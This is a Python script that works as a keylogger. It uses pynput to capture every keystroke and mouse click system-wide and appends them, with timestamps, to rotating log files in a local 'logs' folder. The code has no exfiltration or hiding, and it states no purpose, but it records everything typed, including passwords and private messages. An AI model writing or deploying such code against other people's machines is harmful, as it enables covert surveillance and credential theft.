from pynput import keyboard, mouse
from datetime import datetime
from pathlib import Path
import time

max_file_size = 10_000_000
delay_between_writes = 15
now = time.time()
data = None
file_name = None

# Keyboard Listener

def on_press(key):

    global now, data, delay_between_writes
    delay = time.time() - now

    if delay >= delay_between_writes:
        data = data + f'\n[###{datetime.now()}###]\n'
    
    now = time.time()

    try:
        data = data + key.char
    except AttributeError:
        data = data + f'[{key}]'
        write_text_with_datetime(data, directory='logs')
        data = ''
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    print(f'{key} released')

# Mouse Listener

def on_move(x, y):
    print(f"Souris à ({x}, {y})")

def on_click(x, y, button, pressed):

    global data

    if pressed:
        data = data + f'\n[{button}:({x},{y}]'
        write_text_with_datetime(data, directory='logs')
        data = ''

def on_scroll(x, y, dx, dy):
    print(f"Molette à ({x}, {y}) dx={dx} dy={dy}")

# functions business

def write_text_with_datetime(
    content: str,
    directory: str | Path = ".",
    *,
    encoding: str = "utf-8"
) -> Path:

    global file_name, max_file_size
    
    if not isinstance(content, str):
        raise TypeError(f"content must be a str, got {type(content).__name__}")

    target_dir = Path(directory)
    target_dir.mkdir(parents=True, exist_ok=True)

    path = target_dir / file_name

    if path.exists() and path.stat().st_size > max_file_size:
        file_name = generate_file_name()
        path = target_dir / file_name

    with path.open("a", encoding=encoding) as file:
        file.write(content)
    return path

def generate_file_name() -> str:
    return f"{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.log"

def main() -> None:

    global data, file_name

    file_name = generate_file_name()

    data = f'[###{datetime.now()}###]\n'

    keyboard_listener = keyboard.Listener(on_press=on_press)
    keyboard_listener.start()

    mouse_listener = mouse.Listener(on_click=on_click)
    mouse_listener.start()

    keyboard_listener.join()
    mouse_listener.stop() 

if __name__ == "__main__":
    main()